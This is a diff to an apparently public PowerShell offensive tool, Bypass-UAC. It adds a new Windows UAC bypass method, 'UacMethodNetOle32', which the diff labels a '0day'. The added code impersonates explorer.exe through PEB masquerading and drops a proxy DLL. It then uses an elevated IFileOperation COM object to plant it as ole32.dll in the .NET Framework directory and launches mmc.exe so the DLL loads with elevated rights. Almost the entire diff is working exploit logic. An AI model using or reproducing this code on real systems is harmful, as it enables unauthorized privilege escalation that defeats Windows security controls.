@@ -21,6 +21,7 @@ Process Status API (PSAPI) which reads the process PEB.
 + ucmDismMethod: x64 Win7+ (unpatched, tested up to 10RS2 14926)
 + UacMethodMMC2: x64 Win7+ (unpatched, tested up to 10RS2 14926)
 + UacMethodTcmsetup: x32/x64 Win7-10 (UAC "0day" ¯\_(ツ)_/¯)
++ UacMethodNetOle32: x32/x64 Win7-10 (UAC "0day" ¯\_(ツ)_/¯)
 
 .DESCRIPTION
 Author: Ruben Boonen (@FuzzySec)
@@ -45,7 +46,7 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
 #>
 	param(
         [Parameter(Mandatory = $True)]
-        [ValidateSet('UacMethodSysprep','ucmDismMethod','UacMethodMMC2','UacMethodTcmsetup')]
+        [ValidateSet('UacMethodSysprep','ucmDismMethod','UacMethodMMC2','UacMethodTcmsetup','UacMethodNetOle32')]
         [String]$Method,
         [Parameter(Mandatory = $False)]
         [String]$CustomDll = $null
@@ -1484,6 +1485,74 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
 
             # Clean-up
             echo "[!] UAC artifact: $($env:SystemRoot + '\System32\tcmsetup.exe.Local\')`n"
+        }
+
+        # UAC "0day" ¯\_(ツ)_/¯
+        'UacMethodNetOle32'
+        {
+            # Hybrid MMC method: mmc some.msc -> Microsoft.NET\Framework[64]\..\ole32.dll
+            # Works on x64/x32 Win7-Win10 (unpatched)
+            if ($OSMajorMinor -lt 6.1) {
+                echo "[!] Your OS does not support this method!`n"
+                Return
+            }
+
+            # Impersonate explorer.exe
+            echo "`n[!] Impersonating explorer.exe!"
+            Masquerade-PEB -BinPath "C:\Windows\explorer.exe"
+
+            if ($DllPath) {
+                echo "[>] Using custom proxy dll.."
+                echo "[+] Dll path: $DllPath"
+            } else {
+                # Write Yamabiko.dll to disk
+                echo "[>] Dropping proxy dll.."
+                Emit-Yamabiko
+            }
+
+            # Get default .NET version
+            [String]$Net_Version = [System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion
+
+            # Get count of PowerShell processes
+            $PS_InitCount = @(Get-Process -Name powershell).Count
+
+            # Expose IFileOperation COM object
+            Invoke-IFileOperation
+
+            # Exploit logic
+            echo "[>] Performing elevated IFileOperation::MoveItem operation.."
+            # x32/x64 .NET folder
+            if ($x64) {
+                $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\Microsoft.NET\Framework64\' + $Net_Version + '\'), "ole32.dll")
+            } else {
+                $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\Microsoft.NET\Framework\' + $Net_Version + '\'), "ole32.dll")
+            }
+            $IFileOperation.PerformOperations()
+            echo "`n[?] Executing mmc.."
+            IEX $($env:SystemRoot + '\System32\mmc.exe gpedit.msc')
+
+            # Move Yamabiko back to %tmp% after it loads to avoid infinite shells!
+            while ($true) {
+                $PS_Count = @(Get-Process -Name powershell).Count
+                if ($PS_Count -gt $PS_InitCount) {
+                    try {
+                        # x32/x64 .NET foler
+                        if ($x64) {
+                            $IFileOperation.MoveItem($($env:SystemRoot + '\Microsoft.NET\Framework64\' + $Net_Version + '\ole32.dll'), $($env:Temp + '\'), 'ole32.dll')
+                        } else {
+                            $IFileOperation.MoveItem($($env:SystemRoot + '\Microsoft.NET\Framework\' + $Net_Version + '\ole32.dll'), $($env:Temp + '\'), 'ole32.dll')
+                        }
+                        $IFileOperation.PerformOperations()
+                        break
+                    } catch {
+                        # Sometimes IFileOperation throws an exception
+                        # when executed twice in a row, just rerun..
+                    }
+                }
+            }
+
+            # Clean-up
+            echo "[!] UAC artifact: $($env:Temp + '\ole32.dll')`n"
         }
     }
 }
